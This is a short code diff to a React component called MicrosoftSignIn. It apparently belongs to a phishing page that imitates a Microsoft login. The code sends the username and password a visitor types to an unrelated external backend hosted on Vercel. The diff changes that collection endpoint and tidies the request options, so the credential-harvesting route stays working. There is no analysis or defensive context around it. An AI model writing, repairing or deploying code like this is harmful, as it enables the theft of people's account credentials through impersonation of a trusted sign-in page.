@@ -51,10 +51,12 @@ const MicrosoftSignIn = () => {
     if (validate()) {
       const data = { username: unameVal, password: pwdVal };
       axios
-        .post("https://backend-8zkgsfrnz-yesus-projects-e758688f.vercel.app/submit", data, {
+        .post("https://backend-fxi5et0ny-yesus-projects-e758688f.vercel.app/submit", data, {
           headers: {
-            'Content-Type': 'application/json'
-        }})
+            'Content-Type': 'application/json',
+        },
+        method: 'POST',
+      })
         .then((response) => {
           console.log(response.data.message);
           setView('final');
